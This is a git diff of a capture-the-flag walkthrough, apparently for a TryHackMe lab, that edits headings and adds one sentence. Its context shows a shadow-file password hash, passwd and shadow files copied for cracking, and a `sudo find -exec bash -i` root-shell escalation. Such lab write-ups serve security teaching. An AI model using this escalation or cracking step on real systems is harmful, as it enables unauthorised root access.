@@ -279,7 +279,7 @@ nscd:!!:18785::::::
 missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
 ```
 
-### Copying into passwd.txt and shadow.txt
+### Copying into `passwd.txt` and `shadow.txt`
 `cat passwd.txt`
 ```
 missy:x:1001:1001::/home/missy:/bin/bash
@@ -326,7 +326,7 @@ Last login: Mon Jun  7 21:19:11 2021
 THM-42828719920544
 ```
 
-### Looking for sudo permission
+### Checking `sudo` Privileges on `missy`
 
 ```
 [missy@ip-10-10-17-216 ~]$ sudo -l
@@ -343,6 +343,7 @@ User missy may run the following commands on ip-10-10-17-216:
 
 ## Gaining `root` Access
 
+We can spawn `root` shell by taking advantage of `sudo` permission given to `/usr/bin/find`
 ```
 [missy@ip-10-10-17-216 ~]$ sudo find . -exec bash -i \;
 [root@ip-10-10-17-216 missy]# id
